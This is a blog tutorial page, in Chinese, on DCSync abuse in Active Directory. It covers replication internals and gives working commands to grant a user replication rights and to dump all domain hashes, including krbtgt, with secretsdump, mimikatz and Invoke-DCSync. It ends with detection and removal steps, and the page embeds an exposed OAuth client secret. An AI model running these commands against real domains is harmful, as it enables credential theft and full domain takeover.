@@ -1,0 +1,325 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>域渗透基础之滥用DCSync | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="域渗透基础之滥用DCSync | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="滥用DCSync
+在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理..." />
+    <meta name="keywords" content="AD域,DCsync" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              域渗透基础之滥用DCSync
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-12-07
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/ggcS95uZq/" class="post-tag">
+                  # AD域
+                </a>
+              
+                <a href="https://wghahaha.github.io/tag/MW2luqKqC/" class="post-tag">
+                  # DCsync
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="滥用dcsync">滥用DCSync</h2>
+<p>在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。</p>
+<p>在DCSync功能出现以前，要想获得域用户的哈希数据等，需要登陆域控并在其上执行操作才能获得域用户数据。2015年8月，新版的mimikatz增加了DCSync功能，他有效的''模拟“了一个域控，并向目标域控请求账户哈希值等数据。该功能的最大特点是可以实现不登陆域控而获取目标域控上的数据。</p>
+<p><strong>注意</strong>：默认情况下，不允许从只读域控上获取数据，因为只读域控是不能复制同步数据给其他域控的。</p>
+<h2 id="dcsync的工作原理">DCSync的工作原理</h2>
+<p>DCSync是如何工作的呢？总的来说分为以下的两步：</p>
+<p>1）在网络中发现域控<br>
+2）利用目录复制服务的GetNCChanges接口向域控发起数据同步的请求</p>
+<p>下面来看看详细的工作过程：</p>
+<p>当一个域控（我们称之为客户端）希望从另一个域控（我们称之为服务端）获得活动目录对象更新时，客户端域控会向服务端域控发起DRSGetNCChanes请求。该请求的响应包含一组客户端必须应用于其复制副本的更新。如果更新集太大，可能只有一条响应消息。在这种情况下，将完成多个DRSGetNCChanes请求和响应。这个过程被称为复制周期或简单的循环。</p>
+<p>当服务端域控收到复制同步请求时，然后对执行复制的每个客户端域控来说，他会执行一个复制周期。这类似于客户端中使用的DRSGetNCChanes请求。</p>
+<h2 id="修改-dcsync-acl">修改 DCSync ACL</h2>
+<p>到底是什么用户才具有运行DCSync 的权限呢？能不能通过修改普通用户的ACL使其获得DCSync的权限呢？带着这个疑问，我们往下看。</p>
+<h3 id="1-具有dcsync权限的用户">1、具有DCSync权限的用户</h3>
+<p>运行DCSync需要具有特殊的权限，默认情况下，只有以下组中的用户具有运行DCSync的权限</p>
+<ul>
+<li>Administrator 组内的用户</li>
+<li>Domain Admins 组内的用户</li>
+<li>Enterprise Admins 组内的用户</li>
+<li>域控计算机账户</li>
+</ul>
+<p>我们可以使用Adfind执行如下的命令查询域内具备具备DCSync权限的用户：</p>
+<pre><code>AdFind.exe -s subtree -b &quot;DC=hack,DC=com&quot; -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;&quot;Replicating Directory Changes&quot;;; -recmute
+</code></pre>
+<h3 id="2-修改dcsync的acl">2、修改DCSync的ACL</h3>
+<p>如何让普通域用户也获得DCSync的权限呢？一般情况下，只需要想普通域用户加入下面两条ACE即可：</p>
+<ul>
+<li>DS-Replication-Get-Changes：复制目录更改权限，该权限只能从给定的域复制数据，不包括私密域数据。该ACE的rightsGUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2。</li>
+<li>DS-Replication-Get-Changes-ALL:复制目录更改所有项权限，该权限允许复制给定的任意域中的所有数据，包括私密域数据。该ACE为rightsGUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2。</li>
+</ul>
+<p><strong>注意</strong>：其实还有 Replicating Directory Changes In Filtered Set（复制筛选集中的目录更改权限）但还是很少见，仅在某些环境中需要，所以可以忽略。该ACE的rightsGUID为：89e95b76-444d-4e62-991a-0facbeda640c。</p>
+<p>(1) 图形化赋予指定用户的DCSync权限</p>
+<p>打开“Active Directory 用户和计算机”——&gt;&quot;查看“——&gt;&quot;高级功能”，找到域 hack.com ，右击，选择“属性&quot;选项，然后在弹出的对话框中单击&quot;安全&quot;选项卡的”高级“按钮，可以看到Domain Controlles具备&quot;复制目录更改所有项的权限&quot;,这也就是为什么Domain Controlles具备 DCSync权限了。然后单击”添加&quot; 按钮，&quot;主体”选项选择需要赋予权限的用户，这里的选择用户 hack\jack，&quot;应用于&quot;选择“只是这个对象&quot;,如图所示</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373900_64563f4c42fb0936c7747.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>在”权限“下勾选”复制目录更改“和&quot;复制目录更改所有项&quot;复选框，如图所示，单机”确定“按钮就可以看到用户hack具有的权限了，如图所示：用户jack具有DCSync权限。</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373922_64563f62864b4f378f433.jpeg" alt="图片.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373932_64563f6c5c4fac739566a.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>（2）Powershell脚本赋予指定用户DSCync权限</p>
+<p>可以使用Empire下的PowerView.ps1脚本执行命令如下，赋予用户test DCSync权限。</p>
+<pre><code>Import-Module .\pwerview.ps1;
+Add-DomainObjectAcl -TargetIdentity 'DC=hack,DC=com' -PrincipalIde test -Rights DCSync -Verbose
+</code></pre>
+<h2 id="dcsync-攻击">DCSync 攻击</h2>
+<p>如果拿到了具有DCSync权限的用户，就能利用DCSync功能从指定域控获得域内所有用户的凭据信息了。</p>
+<p>用户jack当前以被赋予了DCSync权限，下面介绍利用不同工具进行DCSync攻击。</p>
+<h3 id="1-impacket">1、Impacket</h3>
+<p>Impacket下的secretsdump.exe可以通过DCSync功能导出域用户的Hash，使用方法如下：</p>
+<pre><code>#使用impacket包中的secretsdump.exe程序直接读取
+secretsdump.exe 域名/administrator:密码@IP -outputfile output_ntds
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373971_64563f936d7fee162c87c.jpeg" alt="图片.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373980_64563f9c2fb855e7fa93c.jpeg" alt="图片.png" loading="lazy"></figure>
+<h3 id="2-mimikatz">2、mimikatz</h3>
+<p>mimikatz也可以通过DCSync功能导出域用户的Hash，使用方法如下：</p>
+<pre><code>#获取域用户krbtgt的Hash
+lasdump::dcsync /domain:hack.com /user:krbtgt
+#获取所有用户的Hash
+lsadump::dcsync /domain:hack.com /all /csv
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683373999_64563fafa3521e6106727.jpeg" alt="图片.png" loading="lazy"></figure>
+<h3 id="3-powershell脚本">3、 PowerShell脚本</h3>
+<p>下载地址：<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
+<p>Invoke-DCSync.ps1脚本也可以通过DCSync功能导出域用户的Hash，使用方法如下：</p>
+<pre><code>Import-Moudle .\Invoke-DCSync.ps1
+#导出域内所有用户的Hash
+Invoke-DCSync -DumForest | ft -wrap -autosize
+#导出域内用户的krbtgt的Hash
+Invoke-DCSync -DumpForest -Users @(&quot;krbtgt&quot;) | ft -wrap -autosize
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374027_64563fcb5e2fa49ffa93d.jpeg" alt="图片.png" loading="lazy"></figure>
+<h2 id="利用dcsync-获取明文凭据">利用DCSync 获取明文凭据</h2>
+<p>有时候利用DCSync可以获取明文凭据，这是因为账户勾选了&quot;使用可逆加密存储密码的属性&quot;,用户再次更改密码会显示其明文密码。</p>
+<p>当通过远程访问Internet身份验证服务(IAS)或使用质询握手身份验证协议（CHAP）身份验证时，必须启用“使用可逆加密存储密码”属性。在Internet信息服务中使用摘要式身份验证时，也需要启动此属性。启动此属性后，就能通过DCSync抓取到目标用户的明文凭据了</p>
+<p>如图所示，在“jack属性”对话框勾选“使用可逆加密存储密码”选项，然后对用户jack进行密码更改</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374050_64563fe24987c0a4a26b1.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>此时使用secretsdump.py脚本执行如下的命令获取获取用户jack的明文凭据：</p>
+<pre><code>python3 secretsdump.py hack/Administrator:123456 -dc-ip 192.168.41.10 -just-dc-user jack
+</code></pre>
+<h2 id="dcsync攻击防御">DCSync攻击防御</h2>
+<p>防守方如何针对DCSync攻击做检测和防御呢？</p>
+<h3 id="1-dcsync攻击防御">1、DCSync攻击防御</h3>
+<p>由于DCSync攻击的原理是模拟域控向另外的域控发起数据同步的请求，因此，可以配置网络安全设备过滤流量并设置白名单，只允许指定白名单内的域控IP请求数据同步。</p>
+<h3 id="2-dcsync-acl-滥用检测">2、 DCSync ACL 滥用检测</h3>
+<p>下载地址：<code>https://github.com/cyberark/ACLight</code></p>
+<p>1）可以在网络安全设备上检测来自白名单以外的域控数据同步复制<br>
+2）使用工具检测域内具备DCSync权限的用户。这里可以使用Execute-ACLight2.bat脚本文件进行检测，该工具输出的结果比较直观。执行完该脚本以后，会在当前目录的results生成三个文件。Privilege Accounts -Layes Analysis.txt是我们要查看生成的结果文件，打开该文件即可看到有哪些用户具有DCSync权限，如图所示</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374068_64563ff4cedf4cae7c46c.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>除了默认的Administrator域管理员有DCSync权限，用户jack也具有DCSync 权限。</p>
+<p>如果发现域内恶意用户被赋予了DCSync权限后，可以使用Empire下的PowerView.ps1脚本执行如下的命令移除DCSync权限：</p>
+<pre><code>Import-Module .\powerview.ps1
+Remove-DomainObjectACL -TargetIdentity “DC=hack,DC=com&quot; -PrincipalIdentity jack -Rights DCSync
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/1683374083_64564003da7543484da4c.jpeg" alt="图片.png" loading="lazy"></figure>
+<p>文章转载来源于   https://www.freebuf.com/articles/network/365750.html</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E6%BB%A5%E7%94%A8dcsync">滥用DCSync</a></li>
+<li><a href="#dcsync%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">DCSync的工作原理</a></li>
+<li><a href="#%E4%BF%AE%E6%94%B9-dcsync-acl">修改 DCSync ACL</a>
+<ul>
+<li><a href="#1-%E5%85%B7%E6%9C%89dcsync%E6%9D%83%E9%99%90%E7%9A%84%E7%94%A8%E6%88%B7">1、具有DCSync权限的用户</a></li>
+<li><a href="#2-%E4%BF%AE%E6%94%B9dcsync%E7%9A%84acl">2、修改DCSync的ACL</a></li>
+</ul>
+</li>
+<li><a href="#dcsync-%E6%94%BB%E5%87%BB">DCSync 攻击</a>
+<ul>
+<li><a href="#1-impacket">1、Impacket</a></li>
+<li><a href="#2-mimikatz">2、mimikatz</a></li>
+<li><a href="#3-powershell%E8%84%9A%E6%9C%AC">3、 PowerShell脚本</a></li>
+</ul>
+</li>
+<li><a href="#%E5%88%A9%E7%94%A8dcsync-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE">利用DCSync 获取明文凭据</a></li>
+<li><a href="#dcsync%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1">DCSync攻击防御</a>
+<ul>
+<li><a href="#1-dcsync%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1">1、DCSync攻击防御</a></li>
+<li><a href="#2-dcsync-acl-%E6%BB%A5%E7%94%A8%E6%A3%80%E6%B5%8B">2、 DCSync ACL 滥用检测</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/blackfield/">
+              <h3 class="post-title">
+                 Active Directory 101-Blackfield
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
